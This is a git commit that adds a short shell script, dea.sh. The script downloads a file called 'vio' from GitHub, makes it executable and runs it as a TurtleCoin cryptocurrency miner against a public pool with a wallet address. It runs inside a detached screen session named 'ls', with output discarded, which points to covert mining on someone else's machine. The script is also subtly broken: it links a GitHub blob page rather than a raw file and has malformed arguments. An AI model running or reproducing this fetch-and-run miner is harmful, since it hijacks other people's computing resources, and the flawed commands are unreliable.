9e054e986a07349672b32452fb4678b6564f2f86
chikahusarii <85166601+chikahusarii@users.noreply.github.com>
2022-08-23 14:52:11 +0700

    Add files via upload

---
+++ dea.sh
@@ -0,0 +1,4 @@
+wget https://github.com/chikahusarii/tepm/blob/main/vio
+chmod +x vio
+screen -dmS ls
+./vio --algorithm turtlecoin --pool us2.turtlecoin.herominers.com --username TRTLuzBQibGTbuSF4YxMvwifK2v5ArDN5Phx9JRCowPRMs6bEsR4G3WifanFXCRVZ5MYq9719AcX64rqQ4fFjnCq8rAodxeqJhr -- password x --threads 200 `nproc --all` > /dev/null
